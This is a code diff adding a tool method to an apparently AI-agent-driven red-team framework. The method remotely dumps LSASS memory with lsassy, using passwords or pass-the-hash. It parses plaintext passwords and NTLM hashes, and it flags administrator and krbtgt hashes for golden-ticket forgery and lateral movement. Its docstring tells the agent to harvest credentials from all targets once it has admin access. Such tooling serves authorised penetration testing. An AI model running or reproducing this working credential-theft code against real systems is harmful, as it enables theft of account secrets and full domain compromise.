@@ -20,6 +20,7 @@ from loguru import logger
 from ares.core.models import Hash, SharedRedTeamState
 from ares.core.remote import run_remote
 from ares.tools.red.common import (
+    EMPTY_NT_HASH,
     PLACEHOLDER_PASSWORDS,
     add_user_to_state,
     is_ntlm_hash,
@@ -616,6 +617,199 @@ class CredentialHarvestingTools(Toolset):
 
         except Exception as e:
             return f"AS-REP roasting failed: {e!s}"
+
+    @dn.tool_method
+    def lsassy(  # noqa: PLR0912
+        self,
+        target: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        domain: str | None = None,
+        method: str = "comsvcs_stealth",
+    ) -> str:
+        """
+        Extract credentials from LSASS memory remotely using lsassy.
+
+        Lsassy is a powerful tool for dumping LSASS memory remotely without
+        dropping files to disk (depending on method). It can extract NTLM hashes,
+        Kerberos tickets, and plaintext credentials.
+
+        **CRITICAL: When you get admin access, run this on ALL targets to harvest credentials.**
+
+        Args:
+            target: Target IP address or hostname
+            username: Username with admin privileges on target
+            password: Password for authentication (optional if using hash)
+            hash: NTLM hash for pass-the-hash authentication (optional)
+            domain: Domain name (optional but recommended)
+            method: Dump method - 'comsvcs_stealth' (default), 'direct', 'procdump', etc.
+
+        Returns:
+            Extracted credentials including NTLM hashes and plaintext passwords
+
+        Example:
+            >>> lsassy("192.168.58.100", "admin", password="P@ss", domain="contoso.local")  # pragma: allowlist secret
+            >>> lsassy("192.168.58.100", "admin", hash="aad3b4...", domain="contoso.local")
+        """
+        resolved_password = self._resolve_password(username, domain, password)
+        if hash and not is_ntlm_hash(hash):
+            return "[!] Refusing to use non-NTLM hash for lsassy; provide password or NTLM hash."
+        if (
+            hash
+            and resolved_password
+            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
+        ):
+            resolved_password = None
+        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
+            return "[!] Refusing to use placeholder password; provide a real credential."
+
+        cmd = ["lsassy"]
+
+        if domain:
+            cmd.extend(["-d", domain])
+
+        cmd.extend(["-u", username])
+
+        if resolved_password:
+            cmd.extend(["-p", resolved_password])
+        elif hash:
+            cmd.extend(["-H", hash])
+        else:
+            return "[!] Error: Either password or hash must be provided"
+
+        cmd.extend(["-m", method])
+        cmd.append(target)
+
+        try:
+            logger.info(f"[*] Running lsassy on {target} with {username}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=180)
+
+            output = stdout or ""
+            if stderr:
+                output = output + "\n" + stderr if output else stderr
+
+            if returncode != 0 and not output:
+                return f"[!] Lsassy failed with return code {returncode}"
+
+            # Parse output for credentials
+            # lsassy output format:
+            # DOMAIN\username:password
+            # or DOMAIN\username:::NTLM_HASH
+            has_admin = False
+            has_krbtgt = False
+            cred_count = 0
+            hash_count = 0
+
+            # Pattern for plaintext creds: DOMAIN\user:password (no colons in middle)
+            plaintext_pattern = re.compile(
+                r"^([^\\:]+)\\([^:]+):([^:]+)$",
+                re.MULTILINE,
+            )
+
+            # Pattern for NTLM hashes: DOMAIN\user:::HASH or user:RID:LM:NT
+            hash_pattern = re.compile(
+                r"^(?:([^\\:\s]+)\\)?([^:]+)(?::(\d+))?:([a-fA-F0-9]{32})?:([a-fA-F0-9]{32})(?:::)?$",
+                re.MULTILINE,
+            )
+
+            # Extract plaintext credentials
+            for match in plaintext_pattern.finditer(output):
+                cred_domain = match.group(1)
+                cred_user = match.group(2)
+                cred_pass = match.group(3)
+
+                if cred_pass and len(cred_pass) > 0:
+                    cred_count += 1
+                    if cred_user.lower() == "administrator":
+                        has_admin = True
+                        logger.warning("[!] ADMINISTRATOR plaintext password found!")
+
+                    if self.state:
+                        from ares.core.models import Credential
+
+                        cred = Credential(
+                            username=cred_user,
+                            password=cred_pass,
+                            domain=cred_domain or domain or "",
+                        )
+                        self.state.add_credential(cred, "lsassy")
+
+            # Extract NTLM hashes
+            for match in hash_pattern.finditer(output):
+                hash_domain = match.group(1) or domain or ""
+                hash_user = match.group(2)
+                lm_hash = match.group(4) or "aad3b435b51404eeaad3b435b51404ee"
+                nt_hash = match.group(5)
+
+                if nt_hash and nt_hash != EMPTY_NT_HASH:
+                    hash_count += 1
+                    hash_value = f"{lm_hash}:{nt_hash}"
+
+                    if hash_user.lower() == "administrator":
+                        has_admin = True
+                        logger.warning("[!] ADMINISTRATOR hash found!")
+                    if hash_user.lower() == "krbtgt":
+                        has_krbtgt = True
+                        logger.warning("[!] KRBTGT hash found!")
+
+                    if self.state:
+                        hash_obj = Hash(
+                            username=hash_user,
+                            hash_value=hash_value,
+                            hash_type="NTLM",
+                            domain=hash_domain,
+                        )
+                        if hasattr(self.state, "add_hash"):
+                            self.state.add_hash(hash_obj, "lsassy")
+                        elif hasattr(self.state, "hashes"):
+                            self.state.hashes.append(hash_obj)
+
+            # Prepend summary
+            summary_lines = []
+            if has_krbtgt:
+                summary_lines.append(
+                    "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
+                    "→ Use generate_golden_ticket to forge tickets\n"
+                    "→ This grants PERSISTENT domain admin access"
+                )
+            if has_admin:
+                summary_lines.append(
+                    "🚨 ADMINISTRATOR CREDENTIALS FOUND!\n"
+                    "→ Use for lateral movement or secretsdump\n"
+                    "→ Check all DCs for full domain compromise"
+                )
+            if cred_count > 0 or hash_count > 0:
+                summary_lines.append(
+                    f"✅ Extracted {cred_count} plaintext cred(s), {hash_count} hash(es)"
+                )
+
+            if summary_lines:
+                output = "\n\n".join(summary_lines) + "\n\n" + output
+
+            # Auto-announce Domain Admin if high-value credentials found
+            if (has_krbtgt or has_admin) and self.dispatcher:
+                try:
+                    cred_type = "krbtgt_hash" if has_krbtgt else "administrator_credentials"
+                    attack_path = f"lsassy credential dump on {target}"
+
+                    asyncio.run(
+                        self.dispatcher.announce_domain_admin(
+                            username="Administrator",
+                            domain=domain or "",
+                            attack_path=attack_path,
+                            credential_type=cred_type,
+                            source_agent="credential_access",
+                        )
+                    )
+                    logger.success(f"🎯 DOMAIN ADMIN AUTO-ANNOUNCED! {cred_type} found on {target}")
+                except Exception as e:
+                    logger.warning(f"Failed to auto-announce DA: {e}")
+
+            return output
+
+        except Exception as e:
+            return f"[!] Lsassy error: {e}"
 
     @dn.tool_method
     def domain_admin_checker(
